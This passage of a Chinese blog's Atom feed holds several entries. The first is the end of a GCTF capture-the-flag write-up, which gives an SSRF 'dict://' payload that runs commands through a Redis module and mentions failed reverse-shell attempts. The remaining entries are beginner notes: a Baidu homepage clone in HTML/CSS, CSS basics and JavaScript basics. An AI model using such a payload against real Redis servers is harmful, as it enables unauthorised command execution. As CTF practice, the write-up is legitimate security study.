class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:6379/system.exec &#x27;whoami&#x27; //也需要base64后放在pop链子里</span><br></pre></td></tr></table></figure><p>并且尝试了很多反弹shell的方法都没成功,system.rev也没能执行,不知道是不是脚本的问题</p><p>止步于此</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GCTF&quot;&gt;&lt;a href=&quot;#GCTF&quot; class=&quot;headerlink&quot; title=&quot;GCTF&quot;&gt;&lt;/a&gt;GCTF&lt;/h1&gt;&lt;h2 id=&quot;ezezezphp&quot;&gt;&lt;a href=&quot;#ezezezphp&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>简易baidu页面</title>
    <link href="http://example.com/2024/01/22/%E7%AE%80%E6%98%93baidu%E9%A1%B5%E9%9D%A2/"/>
    <id>http://example.com/2024/01/22/%E7%AE%80%E6%98%93baidu%E9%A1%B5%E9%9D%A2/</id>
    <published>2024-01-22T15:21:15.000Z</published>
    <updated>2024-01-22T15:26:14.227Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122232416816.png" alt="image-20240122232416816"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下,你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;baidu.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;leftUp&quot;</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;leftUp&quot;</span>&gt;</span>hao123<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;leftUp&quot;</span>&gt;</span>地图<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;leftUp&quot;</span>&gt;</span>视频<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;leftUp&quot;</span>&gt;</span>贴吧<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;leftUp&quot;</span>&gt;</span>学术<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;leftUp&quot;</span>&gt;</span>更多<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;rightUp&quot;</span>&gt;</span>天气<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;rightUp&quot;</span>&gt;</span>设置<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;rightUp&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;middle&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;fond&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;search&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;baidu-button&quot;</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footers&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;footer-item&quot;</span>&gt;</span>关于百度<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;footer-item&quot;</span>&gt;</span>About Baidu<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;footer-item&quot;</span>&gt;</span>使用百度前必读<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;footer-item&quot;</span>&gt;</span>帮助中心<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;footer-item&quot;</span>&gt;</span>关于百度<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;footer-item&quot;</span>&gt;</span>企业推广<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;footer-item&quot;</span>&gt;</span>京公网安备11000002000001号<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;footer-item&quot;</span>&gt;</span>京ICP证030173号<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;footer-item&quot;</span>&gt;</span>互联网新闻信息服务许可证11220180008<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;footer-item&quot;</span>&gt;</span>网络文化经营许可证： 京网文〔2023〕1034-029号号<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.logo</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.header</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: right;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">21px</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">8px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">13px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.leftUp</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#333</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">7px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.rightUp</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: right;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.fond</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">656px</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>);</span><br><span class="line">    <span class="attribute">padding-top</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.search</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">512px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">12px</span> <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">10px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="number">#c4c7ce</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#222</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.baidu-button</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">108px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">44px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: -<span class="number">1px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">44px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#4e6ef2</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">10px</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">17px</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: none;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">400</span>;</span><br><span class="line">    <span class="attribute">border</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#646262</span>;</span><br><span class="line">    <span class="attribute">float</span>: center;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">13px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">10px</span>;</span><br><span class="line">   <span class="attribute">background-color</span>: <span class="number">#f2f2f2</span>; </span><br><span class="line">  <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">  <span class="attribute">margin-top</span>: auto;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">450px</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122232416816.png&quot; alt=&quot;image-20240122232416816&quot;&gt;&lt;/p&gt;
&lt;figure clas</summary>
      
    
    
    
    <category term="语言基础" scheme="http://example.com/categories/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="baidu页面" scheme="http://example.com/tags/baidu%E9%A1%B5%E9%9D%A2/"/>
    
  </entry>
  
  <entry>
    <title>CSS基础</title>
    <link href="http://example.com/2024/01/22/CSS%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/01/22/CSS%E5%9F%BA%E7%A1%80/</id>
    <published>2024-01-22T07:48:07.000Z</published>
    <updated>2024-01-22T09:54:59.799Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSS基础"><a href="#CSS基础" class="headerlink" title="CSS基础"></a>CSS基础</h1><p>HTML本身的样式和颜色是比较朴素的,所以就需要CSS来自定义其样式</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS">https://developer.mozilla.org/zh-CN/docs/Learn/CSS</a></p><h2 id="三种CSS的添加方式"><a href="#三种CSS的添加方式" class="headerlink" title="三种CSS的添加方式"></a>三种CSS的添加方式</h2><h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><p>CSS保存在.css文件中,在html中使用<code>&lt;link&gt;</code>引用</p><p>如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./css/style.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><p>将CSS放在html的<code>&lt;style&gt;</code>里</p><h3 id="内联样式表"><a href="#内联样式表" class="headerlink" title="内联样式表"></a>内联样式表</h3><p>在某一个元素中直接添加</p><p><strong>一般使用外部样式表</strong></p><h2 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h2><p>一般可以通过以下三种选择器对特定的元素改变样式</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122164046366.png" alt="image-20240122164046366"></p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>如上,css采用</p><blockquote><p>选择器 {</p><p>​<code>/*注释*/</code></p><p>​属性: 值;</p><p>​属性: 值;</p><p>​…</p><p>}</p></blockquote><p>这样的语法来完成样式的定制</p><h2 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h2><p>在css中常用__标准颜色名称,十六进制颜色表示,RGB颜色模型,HSL颜色模型__来表示颜色,</p><h3 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h3><p>三个参数: red,green,blue</p><h3 id="HSL"><a href="#HSL" class="headerlink" title="HSL"></a>HSL</h3><p>三个参数: 色相(hue)(0<del>360),饱和度(saturatio)(0%</del>100%),明度(lightness)(0%~100%)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122172530961.png" alt="image-20240122172530961"></p><p>示例:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>:red;&#125;</span><br><span class="line"><span class="selector-tag">h1</span> &#123;<span class="attribute">color</span>:<span class="number">#00ff00</span>;&#125;</span><br><span class="line"><span class="selector-tag">h2</span> &#123;<span class="attribute">color</span>:<span class="built_in">rgb</span>(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure><h2 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h2><p>我们可以通过盒子模型来改变一块内容各个区域的大小</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122170625448.png" alt="image-20240122170625448"></p><ul><li><strong>Margin(外边距)</strong> - 清除边框外的区域，外边距是透明的。</li><li><strong>Border(边框)</strong> - 围绕在内边距和内容外的边框。</li><li><strong>Padding(内边距)</strong> - 清除内容周围的区域，内边距是透明的。</li><li><strong>Content(内容)</strong> - 盒子的内容，显示文本和图像。</li></ul><p>一个块元素有以上几个部分构成</p><p>设置示例:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然也可以针对不同边框的不同部分进行设置</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122172808392.png" alt="image-20240122172808392"></p><p>示例:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">padding-left</span>: red;</span><br><span class="line">    <span class="attribute">margin-top</span>: yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分组与嵌套"><a href="#分组与嵌套" class="headerlink" title="分组与嵌套"></a>分组与嵌套</h2><p>假设对h1,h2,p的css样式相同,可以这样写</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">color</span>:green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设对p标签但不同类的元素有不同css样式,可以这样写</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.nacl</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.cabbage</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>p{ }</strong>: 为所有 <strong>p</strong> 元素指定一个样式。</li><li><strong>.marked{ }</strong>: 为所有 <strong>class&#x3D;”marked”</strong> 的元素指定一个样式。</li><li><strong>.marked p{ }</strong>: 为所有 <strong>class&#x3D;”marked”</strong> 元素内的 <strong>p</strong> 元素指定一个样式。</li><li><strong>p.marked{ }</strong>: 为所有 <strong>class&#x3D;”marked”</strong> 的 <strong>p</strong> 元素指定一个样式。</li></ul></blockquote><h2 id="组合选择符"><a href="#组合选择符" class="headerlink" title="组合选择符"></a>组合选择符</h2><p>在 CSS3 中包含了四种组合方式:</p><ul><li>后代选择器(以空格   分隔)</li><li>子元素选择器(以大于 <strong>&gt;</strong> 号分隔）</li><li>相邻兄弟选择器（以加号 <strong>+</strong> 分隔）</li><li>普通兄弟选择器（以波浪号 <strong>～</strong> 分隔）</li></ul><p>例子:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> <span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">background-color</span>:yellow;</span><br><span class="line">&#125;</span><br><span class="line">表示选择所有在<span class="selector-tag">div</span>标签内的<span class="selector-tag">p</span>标签,无论怎么嵌套</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>&gt;<span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">background-color</span>:yellow;</span><br><span class="line">&#125;</span><br><span class="line">表示选择用于<span class="selector-tag">div</span>标签为父元素的<span class="selector-tag">p</span>标签,即<span class="selector-tag">p</span>为<span class="selector-tag">div</span>的下一级(嵌套一次)</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>+<span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">background-color</span>:yellow;</span><br><span class="line">&#125;</span><br><span class="line">选择紧挨在<span class="selector-tag">div</span>元素的一个<span class="selector-tag">p</span>元素,且他们同父</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>~<span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">background-color</span>:yellow;</span><br><span class="line">&#125;</span><br><span class="line">选择<span class="selector-tag">div</span>元素之后的所有相邻兄弟<span class="selector-tag">p</span>元素,即选择一连串与之相邻不间断的<span class="selector-tag">p</span>元素</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CSS基础&quot;&gt;&lt;a href=&quot;#CSS基础&quot; class=&quot;headerlink&quot; title=&quot;CSS基础&quot;&gt;&lt;/a&gt;CSS基础&lt;/h1&gt;&lt;p&gt;HTML本身的样式和颜色是比较朴素的,所以就需要CSS来自定义其样式&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https:/</summary>
      
    
    
    
    <category term="语言基础" scheme="http://example.com/categories/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="CSS基础" scheme="http://example.com/tags/CSS%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>js基础</title>
    <link href="http://example.com/2024/01/21/js%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/01/21/js%E5%9F%BA%E7%A1%80/</id>
    <published>2024-01-21T11:25:52.000Z</published>
    <updated>2024-01-22T13:09:27.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Javascript基础"><a href="#Javascript基础" class="headerlink" title="Javascript基础"></a>Javascript基础</h1><h2 id="添加方式"><a href="#添加方式" class="headerlink" title="添加方式"></a>添加方式</h2><p>三种添加方式</p><h3 id="内部的Javascript"><a href="#内部的Javascript" class="headerlink" title="内部的Javascript"></a>内部的Javascript</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">//code</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="外部的Javascript"><a href="#外部的Javascript" class="headerlink" title="外部的Javascript"></a>外部的Javascript</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="内联的Javascript"><a href="#内联的Javascript" class="headerlink" title="内联的Javascript"></a>内联的Javascript</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span></span><br><span class="line">    onclick=&quot;myFunction()&quot;&gt;</span><br><span class="line">    Click me</span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="JavaScript输出"><a href="#JavaScript输出" class="headerlink" title="JavaScript输出"></a>JavaScript输出</h2><ul><li>使用 <strong>window.alert()</strong> 弹出警告框。</li><li>使用 <strong>document.write()</strong> 方法将内容写到 HTML 文档中。</li><li>使用 <strong>innerHTML</strong> 写入到 HTML 元素。</li><li>使用 <strong>console.log()</strong> 写入到浏览器的控制台。</li></ul><h2 id="JS变量"><a href="#JS变量" class="headerlink" title="JS变量"></a>JS变量</h2><p>一般地,我们使用var,let,const来定义变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">456</span>;</span><br><span class="line"><span class="keyword">const</span> c = <span class="number">789</span>;</span><br><span class="line">d = <span class="number">123</span>;<span class="comment">//当没有let或var等,默认作用域为全局</span></span><br></pre></td></tr></table></figure><p>解释器会对其进行自动类型推断</p><p>不同的是:</p><blockquote><p><strong>var定义的变量，没有块的概念，可以跨块访问, 不能跨函数访问。</strong> 